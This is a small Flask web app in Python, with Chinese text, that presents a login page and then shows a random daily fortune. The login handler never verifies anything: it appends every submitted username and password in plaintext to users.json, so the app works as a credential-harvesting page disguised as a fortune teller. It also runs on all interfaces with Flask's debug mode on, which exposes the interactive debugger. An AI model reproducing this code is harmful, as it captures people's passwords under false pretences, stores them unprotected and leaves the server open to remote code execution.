import os
import json
import random
from flask import Flask, request, render_template
app = Flask(__name__)
fortunes = [
    '大吉大利，今天会有好事发生！',
    '运气一般，要多注意可能出现的问题。',
    '小心行事，可能有不利的事情发生。',
    '运势非常好，可以尝试一些新的事情。',
    '运势平平，日常生活会过得很平稳。'
]
@app.route('/')
def home():
    return render_template('login.html')
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    if not os.path.exists('users.json'):
        with open('users.json', 'w') as f:
            f.write('')
        return "用户名或密码错误！"
    user_data = {
        'username': username,
        'password': password
    }
    with open('users.json', 'a') as f:
        json.dump(user_data, f)
        f.write('\n')
    fortune = random.choice(fortunes)
    return '恭喜你，你今天的运势是：' + fortune
if __name__ == '__main__':
    app.run(host='0.0.0.0',port = 8000, debug=True)

